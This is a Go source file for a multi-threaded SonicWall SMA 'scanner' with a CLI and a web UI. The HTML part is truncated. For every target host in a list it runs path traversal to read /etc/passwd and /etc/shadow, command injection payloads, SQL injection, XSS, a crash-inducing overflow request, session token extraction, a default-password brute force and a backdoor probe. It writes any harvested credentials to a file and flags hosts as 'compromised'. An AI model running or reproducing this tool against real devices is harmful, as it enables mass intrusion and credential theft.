package main

import (
	"bufio"
	"context"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"os/signal"
	"regexp"
	"runtime"
	"strings"
	"sync"
	"syscall"
	"time"

	"github.com/gorilla/websocket"
)

const version = "3.2.0"

type ExploitResult struct {
	Target      string   `json:"target"`
	Vulnerable  bool     `json:"vulnerable"`
	CVE         string   `json:"cve"`
	Name        string   `json:"name"`
	Details     string   `json:"details"`
	Credentials []string `json:"credentials,omitempty"`
	Extracted   string   `json:"extracted,omitempty"`
}

type ScanResult struct {
	Target      string          `json:"target"`
	Timestamp   time.Time       `json:"timestamp"`
	Access      string          `json:"access"`
	DeviceInfo  DeviceInfo      `json:"device_info"`
	Exploits    []ExploitResult `json:"exploits"`
	Credentials []string        `json:"credentials"`
}

type DeviceInfo struct {
	IsSonicWall bool   `json:"is_sonicwall"`
	IsSMA       bool   `json:"is_sma"`
	Model       string `json:"model"`
	Version     string `json:"version"`
	Port        string `json:"port"`
}

type Target struct {
	Host     string `json:"host"`
	Port     string `json:"port"`
	Username string `json:"username"`
	Password string `json:"password"`
}

type SonicScanner struct {
	client      *http.Client
	wsClients   map[*websocket.Conn]bool
	wsMu        sync.RWMutex
	resultsMu   sync.Mutex
	resultsFile *os.File
	stats       map[string]int
	statsMu     sync.RWMutex
	debug       bool
	stopChan    chan struct{}
	scanning    bool
	scanMu      sync.RWMutex
}

func NewSonicScanner() *SonicScanner {
	if err := os.MkdirAll("static", 0755); err != nil {
		fmt.Printf("Error creating static dir: %v\n", err)
	}
	if err := os.MkdirAll("results", 0755); err != nil {
		fmt.Printf("Error creating results dir: %v\n", err)
	}
	
	resultsFile, err := os.OpenFile("results/scan_results.jsonl", os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Printf("Error opening results file: %v\n", err)
	}

	tr := &http.Transport{
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true,
			NextProtos:         []string{"http/1.1"},
		},
		DisableKeepAlives:     true,
		MaxIdleConns:          0,
		MaxIdleConnsPerHost:   0,
		ResponseHeaderTimeout: 10 * time.Second,
		IdleConnTimeout:       10 * time.Second,
	}

	client := &http.Client{
		Transport: tr,
		Timeout:   15 * time.Second,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	return &SonicScanner{
		client:      client,
		wsClients:   make(map[*websocket.Conn]bool),
		resultsFile: resultsFile,
		stats: map[string]int{
			"total":       0,
			"vulnerable":  0,
			"compromised": 0,
			"errors":      0,
		},
		debug:    false,
		stopChan: make(chan struct{}),
		scanning: false,
	}
}

func (s *SonicScanner) detectDevice(target string) DeviceInfo {
	info := DeviceInfo{IsSonicWall: false, IsSMA: false, Port: "443"}
	ports := []string{"443", "4433", "8443", "8080", "80"}
	host := strings.Split(target, ":")[0]

	// Проверяем валидность IP
	if !isValidIP(host) {
		return info
	}

	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()

	for _, port := range ports {
		select {
		case <-ctx.Done():
			return info
		default:
			testURL := fmt.Sprintf("https://%s:%s/", host, port)
			req, err := http.NewRequestWithContext(ctx, "GET", testURL, nil)
			if err != nil {
				continue
			}
			req.Header.Set("User-Agent", "Mozilla/5.0")

			resp, err := s.client.Do(req)
			if err != nil {
				testURL = fmt.Sprintf("http://%s:%s/", host, port)
				req, _ = http.NewRequestWithContext(ctx, "GET", testURL, nil)
				req.Header.Set("User-Agent", "Mozilla/5.0")
				resp, err = s.client.Do(req)
				if err != nil {
					continue
				}
			}

			if resp == nil {
				continue
			}

			body, err := io.ReadAll(resp.Body)
			resp.Body.Close()
			if err != nil {
				continue
			}
			content := string(body)

			if strings.Contains(strings.ToLower(content), "sonicwall") {
				info.IsSonicWall = true
				info.Port = port

				if strings.Contains(strings.ToLower(content), "sma") ||
					strings.Contains(strings.ToLower(content), "ssl vpn") {
					info.IsSMA = true
				}
				info.Model = s.extractModel(content)
				info.Version = s.extractVersion(content)
				break
			}
		}
	}

	return info
}

func isValidIP(host string) bool {
	// Проверяем IP адрес
	if net.ParseIP(host) != nil {
		return true
	}
	// Проверяем доменное имя
	re := regexp.MustCompile(`^[a-zA-Z0-9][a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$`)
	return re.MatchString(host)
}

func (s *SonicScanner) extractModel(content string) string {
	patterns := []string{`SMA\s*\d{3,4}`, `TZ\d{3,4}`, `NSa\s*\d{4}`, `NSA\s*\d{4}`}
	for _, pattern := range patterns {
		re := regexp.MustCompile(`(?i)` + pattern)
		if match := re.FindString(content); match != "" {
			return strings.ToUpper(match)
		}
	}
	return "SonicWall Device"
}

func (s *SonicScanner) extractVersion(content string) string {
	patterns := []string{
		`(?:version|firmware)[\s]*[=:][\s]*["']?([\d\.]+)`,
		`SonicOS\s+([\d\.]+)`,
		`v([\d\.]+)`,
	}
	for _, pattern := range patterns {
		re := regexp.MustCompile(`(?i)` + pattern)
		if match := re.FindStringSubmatch(content); len(match) > 1 {
			return match[1]
		}
	}
	return "Unknown"
}

func (s *SonicScanner) exploitPathTraversal(target string) ExploitResult {
	paths := []string{
		"/cgi-bin/sslvpnclient?sw=../../../../etc/passwd",
		"/cgi-bin/sslvpnclient?session=../../../../etc/passwd",
		"/cgi-bin/sslvpnclient?domain=../../../../etc/passwd",
		"/cgi-bin/sslvpnclient?arg=../../../../etc/passwd",
		"/cgi-bin/sslvpnclient?sw=../../../../etc/config/db/config",
		"/cgi-bin/sslvpnclient?sw=../../../../etc/shadow",
	}

	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()

	for _, path := range paths {
		select {
		case <-ctx.Done():
			return ExploitResult{CVE: "CVE-2023-44221", Vulnerable: false, Name: "Path Traversal"}
		default:
			reqURL := fmt.Sprintf("https://%s%s", target, path)
			req, err := http.NewRequestWithContext(ctx, "GET", reqURL, nil)
			if err != nil {
				continue
			}
			req.Header.Set("User-Agent", "Mozilla/5.0")
			req.Header.Set("X-Forwarded-For", "127.0.0.1")

			resp, err := s.client.Do(req)
			if err != nil {
				continue
			}

			body, err := io.ReadAll(resp.Body)
			resp.Body.Close()
			if err != nil {
				continue
			}
			bodyStr := string(body)

			if strings.Contains(bodyStr, "root:x:") || strings.Contains(bodyStr, "admin:") {
				creds := []string{}
				rePass := regexp.MustCompile(`(password|passwd|secret)[\s]*[=:][\s]*["']?([^"'\s]+)`)
				matches := rePass.FindAllStringSubmatch(bodyStr, -1)
				for _, m := range matches {
					if len(m) > 2 && len(m[2]) > 0 && m[2] != "password" {
						creds = append(creds, fmt.Sprintf("%s=%s", m[1], m[2]))
					}
				}

				extracted := bodyStr
				if len(extracted) > 500 {
					extracted = extracted[:500] + "..."
				}

				return ExploitResult{
					CVE:         "CVE-2023-44221",
					Name:        "Path Traversal to Config Disclosure",
					Vulnerable:  true,
					Details:     fmt.Sprintf("File read via: %s", path),
					Credentials: creds,
					Extracted:   extracted,
				}
			}
		}
	}
	return ExploitResult{CVE: "CVE-2023-44221", Vulnerable: false, Name: "Path Traversal"}
}

func (s *SonicScanner) exploitAuthBypass(target string) ExploitResult {
	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()

	reqURL := fmt.Sprintf("https://%s/cgi-bin/sslvpnclient", target)
	req, err := http.NewRequestWithContext(ctx, "GET", reqURL, nil)
	if err != nil {
		return ExploitResult{CVE: "CVE-2024-40766", Vulnerable: false, Name: "Auth Bypass"}
	}
	req.Header.Set("User-Agent", "SonicWALL SSL-VPN Client")

	resp, err := s.client.Do(req)
	if err != nil {
		return ExploitResult{CVE: "CVE-2024-40766", Vulnerable: false, Name: "Auth Bypass"}
	}
	defer resp.Body.Close()

	cookies := resp.Cookies()
	for _, c := range cookies {
		if (strings.Contains(c.Name, "SESSION") || strings.Contains(c.Name, "JSESSION")) && c.Value != "" {
			return ExploitResult{
				CVE:         "CVE-2024-40766",
				Name:        "Session Token Extraction",
				Vulnerable:  true,
				Credentials: []string{fmt.Sprintf("%s=%s", c.Name, c.Value)},
				Details:     "Session token found without authentication",
			}
		}
	}

	return ExploitResult{CVE: "CVE-2024-40766", Vulnerable: false, Name: "Auth Bypass"}
}

func (s *SonicScanner) exploitDefaultCreds(target string, username, password string) ExploitResult {
	defaultCreds := [][2]string{
		{"admin", "password"}, {"admin", "admin"}, {"admin", "123456"},
		{"admin", "sonicwall"}, {"root", "password"}, {"root", "admin"},
		{"user", "user"}, {"support", "support"}, {"readonly", "readonly"},
		{"monitor", "monitor"}, {"admin", ""}, {"config", "config"},
		{"Administrator", "password"}, {"sonicwall", "sonicwall"},
	}

	if username != "" && password != "" {
		defaultCreds = append([][2]string{{username, password}}, defaultCreds...)
	}

	loginURLs := []string{
		fmt.Sprintf("https://%s/auth.html", target),
		fmt.Sprintf("https://%s/cgi-bin/login", target),
		fmt.Sprintf("https://%s/login.html", target),
		fmt.Sprintf("https://%s/j_security_check", target),
	}

	foundCreds := []string{}
	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
	defer cancel()

	for _, loginURL := range loginURLs {
		for _, cred := range defaultCreds {
			select {
			case <-ctx.Done():
				if len(foundCreds) > 0 {
					return ExploitResult{
						CVE:         "N/A",
						Name:        "Default Credentials",
						Vulnerable:  true,
						Details:     "Device uses default credentials",
						Credentials: foundCreds,
					}
				}
				return ExploitResult{CVE: "N/A", Vulnerable: false, Name: "Default Credentials"}
			default:
				formData := url.Values{}
				formData.Set("username", cred[0])
				formData.Set("password", cred[1])
				formData.Set("j_username", cred[0])
				formData.Set("j_password", cred[1])

				req, err := http.NewRequestWithContext(ctx, "POST", loginURL, strings.NewReader(formData.Encode()))
				if err != nil {
					continue
				}
				req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
				req.Header.Set("User-Agent", "Mozilla/5.0")

				resp, err := s.client.Do(req)
				if err != nil {
					continue
				}

				body, _ := io.ReadAll(resp.Body)
				resp.Body.Close()
				bodyStr := string(body)

				if resp.StatusCode == 302 || (resp.StatusCode == 200 &&
					(strings.Contains(strings.ToLower(bodyStr), "dashboard") ||
						strings.Contains(strings.ToLower(bodyStr), "main.html"))) {
					foundCreds = append(foundCreds, fmt.Sprintf("%s:%s", cred[0], cred[1]))
				}
			}
		}
	}

	if len(foundCreds) > 0 {
		return ExploitResult{
			CVE:         "N/A",
			Name:        "Default Credentials",
			Vulnerable:  true,
			Details:     "Device uses default credentials",
			Credentials: foundCreds,
		}
	}

	return ExploitResult{CVE: "N/A", Vulnerable: false, Name: "Default Credentials"}
}

func (s *SonicScanner) exploitCommandInjection(target string) ExploitResult {
	payloads := []string{
		"127.0.0.1; id",
		"127.0.0.1|id",
		"127.0.0.1&&id",
		";id;",
	}

	endpoints := []string{
		"/cgi-bin/ping?target=%s",
		"/cgi-bin/traceroute?host=%s",
	}

	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()

	for _, endpoint := range endpoints {
		for _, payload := range payloads {
			select {
			case <-ctx.Done():
				return ExploitResult{CVE: "CVE-2021-20039", Vulnerable: false, Name: "Command Injection"}
			default:
				reqURL := fmt.Sprintf("https://%s"+endpoint, target, url.QueryEscape(payload))
				req, err := http.NewRequestWithContext(ctx, "GET", reqURL, nil)
				if err != nil {
					continue
				}
				req.Header.Set("User-Agent", "Mozilla/5.0")

				resp, err := s.client.Do(req)
				if err != nil {
					continue
				}

				body, err := io.ReadAll(resp.Body)
				resp.Body.Close()
				if err != nil {
					continue
				}
				bodyStr := string(body)

				if strings.Contains(bodyStr, "uid=") || strings.Contains(bodyStr, "gid=") {
					extracted := bodyStr
					if len(extracted) > 500 {
						extracted = extracted[:500]
					}
					return ExploitResult{
						CVE:        "CVE-2021-20039",
						Name:       "Command Injection",
						Vulnerable: true,
						Details:    fmt.Sprintf("Command injection with: %s", payload),
						Extracted:  extracted,
					}
				}
			}
		}
	}

	return ExploitResult{CVE: "CVE-2021-20039", Vulnerable: false, Name: "Command Injection"}
}

func (s *SonicScanner) exploitBufferOverflow(target string) ExploitResult {
	longPayload := strings.Repeat("A", 3000)
	paths := []string{
		fmt.Sprintf("/__api__/v1/%s", longPayload),
		fmt.Sprintf("/cgi-bin/sslvpnclient?session=%s", longPayload),
	}

	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()

	for _, path := range paths {
		select {
		case <-ctx.Done():
			return ExploitResult{CVE: "CVE-2025-40596", Vulnerable: false, Name: "Buffer Overflow"}
		default:
			reqURL := fmt.Sprintf("https://%s%s", target, path)
			req, err := http.NewRequestWithContext(ctx, "GET", reqURL, nil)
			if err != nil {
				continue
			}
			req.Header.Set("User-Agent", "Mozilla/5.0")

			start := time.Now()
			resp, err := s.client.Do(req)
			elapsed := time.Since(start)

			if err != nil {
				if strings.Contains(err.Error(), "reset") || strings.Contains(err.Error(), "EOF") ||
					strings.Contains(err.Error(), "timeout") {
					return ExploitResult{
						CVE:        "CVE-2025-40596",
						Name:       "Buffer Overflow",
						Vulnerable: true,
						Details:    fmt.Sprintf("Crash after %.2f seconds", elapsed.Seconds()),
					}
				}
			}
			if resp != nil {
				resp.Body.Close()
			}
		}
	}

	return ExploitResult{CVE: "CVE-2025-40596", Vulnerable: false, Name: "Buffer Overflow"}
}

func (s *SonicScanner) exploitSQLInjection(target string) ExploitResult {
	payloads := []string{
		"' OR '1'='1",
		"' OR 1=1 --",
		"admin' --",
	}

	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()

	for _, payload := range payloads {
		select {
		case <-ctx.Done():
			return ExploitResult{CVE: "CVE-2021-20016", Vulnerable: false, Name: "SQL Injection"}
		default:
			reqURL := fmt.Sprintf("https://%s/cgi-bin/sslvpnclient?user=%s", target, url.QueryEscape(payload))
			req, err := http.NewRequestWithContext(ctx, "GET", reqURL, nil)
			if err != nil {
				continue
			}
			req.Header.Set("User-Agent", "Mozilla/5.0")

			resp, err := s.client.Do(req)
			if err != nil {
				continue
			}

			body, err := io.ReadAll(resp.Body)
			resp.Body.Close()
			if err != nil {
				continue
			}
			bodyStr := string(body)

			if strings.Contains(bodyStr, "SELECT") || strings.Contains(bodyStr, "UNION") ||
				strings.Contains(bodyStr, "SQL") {
				extracted := bodyStr
				if len(extracted) > 500 {
					extracted = extracted[:500]
				}
				return ExploitResult{
					CVE:        "CVE-2021-20016",
					Name:       "SQL Injection",
					Vulnerable: true,
					Details:    "SQL injection confirmed",
					Extracted:  extracted,
				}
			}
		}
	}

	return ExploitResult{CVE: "CVE-2021-20016", Vulnerable: false, Name: "SQL Injection"}
}

func (s *SonicScanner) exploitXSS(target string) ExploitResult {
	payload := "<script>alert('XSS')</script>"
	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()

	reqURL := fmt.Sprintf("https://%s/cgi-bin/sslvpnclient?param=%s", target, url.QueryEscape(payload))
	req, err := http.NewRequestWithContext(ctx, "GET", reqURL, nil)
	if err != nil {
		return ExploitResult{CVE: "CVE-2025-40598", Vulnerable: false, Name: "XSS"}
	}
	req.Header.Set("User-Agent", "Mozilla/5.0")

	resp, err := s.client.Do(req)
	if err != nil {
		return ExploitResult{CVE: "CVE-2025-40598", Vulnerable: false, Name: "XSS"}
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return ExploitResult{CVE: "CVE-2025-40598", Vulnerable: false, Name: "XSS"}
	}
	bodyStr := string(body)

	if strings.Contains(bodyStr, payload) {
		return ExploitResult{
			CVE:        "CVE-2025-40598",
			Name:       "Reflected XSS",
			Vulnerable: true,
			Details:    "XSS payload reflected",
		}
	}

	return ExploitResult{CVE: "CVE-2025-40598", Vulnerable: false, Name: "XSS"}
}

func (s *SonicScanner) exploitOverstepBackdoor(target string) ExploitResult {
	paths := []string{
		"/api/overstep/status",
		"/cgi-bin/backdoor",
		"/.overstep",
	}

	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()

	for _, path := range paths {
		select {
		case <-ctx.Done():
			return ExploitResult{CVE: "N/A", Vulnerable: false, Name: "OVERSTEP Check"}
		default:
			reqURL := fmt.Sprintf("https://%s%s", target, path)
			req, err := http.NewRequestWithContext(ctx, "GET", reqURL, nil)
			if err != nil {
				continue
			}
			req.Header.Set("User-Agent", "Mozilla/5.0")

			resp, err := s.client.Do(req)
			if err != nil {
				continue
			}

			body, err := io.ReadAll(resp.Body)
			resp.Body.Close()
			if err != nil {
				continue
			}
			bodyStr := string(body)

			if resp.StatusCode == 200 && strings.Contains(strings.ToUpper(bodyStr), "OVERSTEP") {
				extracted := bodyStr
				if len(extracted) > 500 {
					extracted = extracted[:500]
				}
				return ExploitResult{
					CVE:        "N/A",
					Name:       "OVERSTEP Backdoor",
					Vulnerable: true,
					Details:    "OVERSTEP backdoor detected",
					Extracted:  extracted,
				}
			}
		}
	}

	return ExploitResult{CVE: "N/A", Vulnerable: false, Name: "OVERSTEP Check"}
}

func (s *SonicScanner) CheckTarget(target Target) ScanResult {
	addr := fmt.Sprintf("%s:%s", target.Host, target.Port)
	fmt.Printf("[*] Scanning: %s\n", addr)

	deviceInfo := s.detectDevice(addr)

	if !deviceInfo.IsSonicWall {
		return ScanResult{
			Target:     addr,
			Timestamp:  time.Now(),
			Access:     "none",
			DeviceInfo: deviceInfo,
			Exploits:   []ExploitResult{},
		}
	}

	scanTarget := fmt.Sprintf("%s:%s", target.Host, deviceInfo.Port)

	exploits := []ExploitResult{}
	allCreds := []string{}

	// Выполняем эксплоиты последовательно
	exploits = append(exploits, s.exploitPathTraversal(scanTarget))
	exploits = append(exploits, s.exploitAuthBypass(scanTarget))
	exploits = append(exploits, s.exploitDefaultCreds(scanTarget, target.Username, target.Password))
	exploits = append(exploits, s.exploitCommandInjection(scanTarget))
	exploits = append(exploits, s.exploitBufferOverflow(scanTarget))
	exploits = append(exploits, s.exploitSQLInjection(scanTarget))
	exploits = append(exploits, s.exploitXSS(scanTarget))
	exploits = append(exploits, s.exploitOverstepBackdoor(scanTarget))

	for _, exp := range exploits {
		if exp.Vulnerable && len(exp.Credentials) > 0 {
			allCreds = append(allCreds, exp.Credentials...)
		}
	}

	access := "none"
	hasVulnerability := false

	for _, exp := range exploits {
		if exp.Vulnerable {
			hasVulnerability = true
			if len(exp.Credentials) > 0 ||
				exp.Name == "OVERSTEP Backdoor" ||
				strings.Contains(exp.Name, "Command Injection") {
				access = "compromised"
				break
			}
		}
	}

	if hasVulnerability && access != "compromised" {
		access = "vulnerable"
	}

	s.statsMu.Lock()
	s.stats["total"]++
	if access == "compromised" {
		s.stats["compromised"]++
	}
	if hasVulnerability {
		s.stats["vulnerable"]++
	}
	s.statsMu.Unlock()

	result := ScanResult{
		Target:      addr,
		Timestamp:   time.Now(),
		Access:      access,
		DeviceInfo:  deviceInfo,
		Exploits:    exploits,
		Credentials: allCreds,
	}

	s.saveResult(result)

	switch access {
	case "compromised":
		fmt.Printf("[!!!] COMPROMISED: %s\n", addr)
	case "vulnerable":
		fmt.Printf("[!] VULNERABLE: %s\n", addr)
	default:
		fmt.Printf("[-] SECURE: %s\n", addr)
	}

	return result
}

func (s *SonicScanner) saveResult(result ScanResult) {
	s.resultsMu.Lock()
	defer s.resultsMu.Unlock()

	if s.resultsFile != nil {
		data, err := json.Marshal(result)
		if err == nil {
			s.resultsFile.WriteString(string(data) + "\n")
			s.resultsFile.Sync()
		}
	}

	if len(result.Credentials) > 0 {
		credsFile, err := os.OpenFile("results/credentials.txt", os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0644)
		if err == nil {
			defer credsFile.Close()
			for _, cred := range result.Credentials {
				credsFile.WriteString(fmt.Sprintf("[%s] %s | %s\n",
					result.Timestamp.Format("2006-01-02 15:04:05"),
					result.Target, cred))
			}
		}
	}
}

func parseTargetsFromFile(filename string) ([]Target, error) {
	file, err := os.Open(filename)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	targets := []Target{}
	scanner := bufio.NewScanner(file)

	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}

		parts := strings.Split(line, ":")

		if len(parts) == 1 {
			targets = append(targets, Target{Host: parts[0], Port: "443", Username: "", Password: ""})
		} else if len(parts) == 2 {
			targets = append(targets, Target{Host: parts[0], Port: parts[1], Username: "", Password: ""})
		} else if len(parts) >= 4 {
			targets = append(targets, Target{Host: parts[0], Port: parts[1], Username: parts[2], Password: parts[3]})
		}
	}

	return targets, scanner.Err()
}

var upgrader = websocket.Upgrader{
	CheckOrigin: func(r *http.Request) bool { return true },
}

type WSMessage struct {
	Action  string   `json:"action"`
	Targets []Target `json:"targets"`
	Threads int      `json:"threads"`
}

func (s *SonicScanner) handleWebSocket(w http.ResponseWriter, r *http.Request) {
	conn, err := upgrader.Upgrade(w, r, nil)
	if err != nil {
		return
	}
	defer conn.Close()

	s.wsMu.Lock()
	s.wsClients[conn] = true
	s.wsMu.Unlock()

	defer func() {
		s.wsMu.Lock()
		delete(s.wsClients, conn)
		s.wsMu.Unlock()
	}()

	// Устанавливаем пинг-понг
	conn.SetPongHandler(func(string) error {
		conn.SetReadDeadline(time.Now().Add(60 * time.Second))
		return nil
	})

	go func() {
		ticker := time.NewTicker(30 * time.Second)
		defer ticker.Stop()
		for {
			select {
			case <-ticker.C:
				conn.SetWriteDeadline(time.Now().Add(10 * time.Second))
				if err := conn.WriteMessage(websocket.PingMessage, nil); err != nil {
					return
				}
			}
		}
	}()

	for {
		var msg WSMessage
		err := conn.ReadJSON(&msg)
		if err != nil {
			break
		}

		switch msg.Action {
		case "ping":
			conn.WriteJSON(map[string]interface{}{
				"type":      "pong",
				"timestamp": time.Now(),
			})
		case "start_scan":
			s.scanMu.Lock()
			if s.scanning {
				s.scanMu.Unlock()
				conn.WriteJSON(map[string]interface{}{
					"type":    "error",
					"message": "Scan already in progress",
				})
				continue
			}
			s.scanning = true
			s.scanMu.Unlock()

			conn.WriteJSON(map[string]interface{}{
				"type":  "started",
				"total": len(msg.Targets),
			})
			go s.runBatchScan(conn, msg.Targets, msg.Threads)
		case "stop_scan":
			s.scanMu.Lock()
			if s.scanning {
				close(s.stopChan)
				s.stopChan = make(chan struct{})
				s.scanning = false
			}
			s.scanMu.Unlock()
			conn.WriteJSON(map[string]interface{}{
				"type":    "stopped",
				"message": "Scan stopped",
			})
		}
	}
}

func (s *SonicScanner) runBatchScan(conn *websocket.Conn, targets []Target, threads int) {
	defer func() {
		s.scanMu.Lock()
		s.scanning = false
		s.scanMu.Unlock()
	}()

	if threads <= 0 {
		threads = 5
	}
	if threads > 20 {
		threads = 20
	}

	total := len(targets)
	results := make(chan ScanResult, total)
	var wg sync.WaitGroup

	// Создаем контекст для возможности остановки сканирования
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	go func() {
		select {
		case <-s.stopChan:
			cancel()
		}
	}()

	for i := 0; i < threads; i++ {
		wg.Add(1)
		go func(workerID int) {
			defer wg.Done()
			for idx, target := range targets {
				if idx%threads != workerID {
					continue
				}
				select {
				case <-ctx.Done():
					return
				default:
					result := s.CheckTarget(target)
					results <- result
					time.Sleep(200 * time.Millisecond)
				}
			}
		}(i)
	}

	go func() {
		wg.Wait()
		close(results)
	}()

	checked := 0
	compromised := 0
	vulnerable := 0

	for result := range results {
		checked++

		if result.Access == "compromised" {
			compromised++
		}
		if result.Access == "vulnerable" {
			vulnerable++
		}

		progress := float64(checked) / float64(total) * 100

		conn.SetWriteDeadline(time.Now().Add(10 * time.Second))
		err := conn.WriteJSON(map[string]interface{}{
			"type":        "progress",
			"checked":     checked,
			"total":       total,
			"progress":    progress,
			"compromised": compromised,
			"vulnerable":  vulnerable,
			"result":      result,
		})
		if err != nil {
			return
		}
	}

	conn.SetWriteDeadline(time.Now().Add(10 * time.Second))
	conn.WriteJSON(map[string]interface{}{
		"type":        "complete",
		"total":       total,
		"compromised": compromised,
		"vulnerable":  vulnerable,
	})
}

func getFreePort() (int, error) {
	listener, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		return 0, err
	}
	defer listener.Close()
	return listener.Addr().(*net.TCPAddr).Port, nil
}

func openBrowser(url string) {
	var err error
	switch runtime.GOOS {
	case "linux":
		err = exec.Command("xdg-open", url).Start()
	case "windows":
		err = exec.Command("rundll32", "url.dll,FileProtocolHandler", url).Start()
	case "darwin":
		err = exec.Command("open", url).Start()
	default:
		fmt.Printf("Please open %s manually\n", url)
		return
	}
	if err != nil {
		fmt.Printf("Error opening browser: %v\n", err)
		fmt.Printf("Please open %s manually\n", url)
	}
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}

func main() {
	fmt.Printf("\n")
	fmt.Printf("========================================\n")
	fmt.Printf("  SonicWall SMA Security Scanner v%s\n", version)
	fmt.Printf("  Multi-threaded | 8+ Active Exploits\n")
	fmt.Printf("  Format: ip / ip:port / ip:port:user:pass\n")
	fmt.Printf("========================================\n\n")

	if err := os.MkdirAll("static", 0755); err != nil {
		fmt.Printf("Error creating static dir: %v\n", err)
	}
	if err := os.MkdirAll("results", 0755); err != nil {
		fmt.Printf("Error creating results dir: %v\n", err)
	}

	scanner := NewSonicScanner()

	// CLI режим
	if len(os.Args) > 1 {
		targets, err := parseTargetsFromFile(os.Args[1])
		if err != nil {
			fmt.Printf("Error loading targets: %v\n", err)
			return
		}

		threads := 5
		if len(os.Args) > 2 {
			fmt.Sscanf(os.Args[2], "%d", &threads)
		}
		if threads <= 0 {
			threads = 5
		}
		if threads > 20 {
			threads = 20
		}

		fmt.Printf("[*] Loaded %d targets\n", len(targets))
		fmt.Printf("[*] Using %d threads\n", threads)

		var wg sync.WaitGroup
		results := make(chan ScanResult, len(targets))

		// Создаем контекст для graceful shutdown
		ctx, cancel := context.WithCancel(context.Background())
		defer cancel()

		sigChan := make(chan os.Signal, 1)
		signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
		go func() {
			<-sigChan
			fmt.Println("\n[*] Received interrupt signal, stopping scan...")
			cancel()
		}()

		for i := 0; i < threads; i++ {
			wg.Add(1)
			go func(workerID int) {
				defer wg.Done()
				for idx, target := range targets {
					if idx%threads != workerID {
						continue
					}
					select {
					case <-ctx.Done():
						return
					default:
						result := scanner.CheckTarget(target)
						results <- result
					}
				}
			}(i)
		}

		go func() {
			wg.Wait()
			close(results)
		}()

		compromised := 0
		vulnerable := 0
		checked := 0

		for result := range results {
			checked++
			if result.Access == "compromised" {
				compromised++
			} else if result.Access == "vulnerable" {
				vulnerable++
			}
		}

		fmt.Printf("\n[*] Scan complete - Checked: %d, Compromised: %d, Vulnerable: %d\n",
			checked, compromised, vulnerable)
		return
	}

	// Web UI режим
	htmlTemplate := getHTMLTemplate(version)
	if err := os.WriteFile("static/index.html", []byte(htmlTemplate), 0644); err != nil {
		fmt.Printf("Error writing index.html: %v\n", err)
	}

	http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path == "/" {
			http.ServeFile(w, r, "static/index.html")
			return
		}
		http.ServeFile(w, r, "static"+r.URL.Path)
	})
	http.HandleFunc("/ws", scanner.handleWebSocket)
	http.Handle("/results/", http.StripPrefix("/results/", http.FileServer(http.Dir("results"))))

	port, err := getFreePort()
	if err != nil {
		port = 9090
	}

	serverURL := fmt.Sprintf("http://127.0.0.1:%d", port)
	fmt.Printf("Web UI: %s\n", serverURL)
	fmt.Printf("CLI mode: %s targets.txt [threads]\n", os.Args[0])
	fmt.Printf("Results: results/scan_results.jsonl\n")
	fmt.Printf("Credentials: results/credentials.txt\n\n")
	fmt.Printf("Press Ctrl+C to stop\n\n")

	server := &http.Server{
		Addr:         fmt.Sprintf("127.0.0.1:%d", port),
		ReadTimeout:  30 * time.Second,
		WriteTimeout: 30 * time.Second,
		IdleTimeout:  60 * time.Second,
	}

	// Graceful shutdown
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)

	go func() {
		<-sigChan
		fmt.Println("\n[*] Shutting down server...")
		ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
		defer cancel()
		if err := server.Shutdown(ctx); err != nil {
			fmt.Printf("Error shutting down: %v\n", err)
		}
		os.Exit(0)
	}()

	go func() {
		time.Sleep(1 * time.Second)
		openBrowser(serverURL)
	}()

	fmt.Printf("[*] Starting web server on %s\n", server.Addr)
	if err := server.ListenAndServe(); err != nil && err != http.ErrServerClosed {
		fmt.Printf("Server error: %v\n", err)
	}
}

func getHTMLTemplate(version string) string {
	return `<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>SonicWall Scanner v` + version + `</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', monospace;
            background: linear-gradient(135deg, #0a0f1e 0%, #0a1a2a 100%);
            color: #00f3ff;
            padding: 20px;
        }
        .container { max-width: 1400px; margin: 0 auto; }
        .header {
            text-align: center;
            padding: 30px;
            background: rgba(0,30,60,0.6);
            border-radius: 20px;
            margin-bottom: 30px;
            border: 1px solid #00f3ff;
        }
        .header h1 { font-size: 2.5em; text-shadow: 0 0 20px #00f3ff; }
        .badge {
            display: inline-block;
            background: #ff00ff;
            padding: 5px 15px;
            border-radius: 20px;
            font-size: 12px;
            margin-top: 10px;
        }
        .grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 25px;
            margin-bottom: 25px;
        }
        .card {
            background: rgba(10,20,40,0.8);
            backdrop-filter: blur(10px);
            border-radius: 15px;
            padding: 25px;
            border: 1px solid rgba(0,243,255,0.3);
        }
        .card h2 {
            margin-bottom: 20px;
            border-left: 3px solid #00f3ff;
            padding-left: 15px;
        }
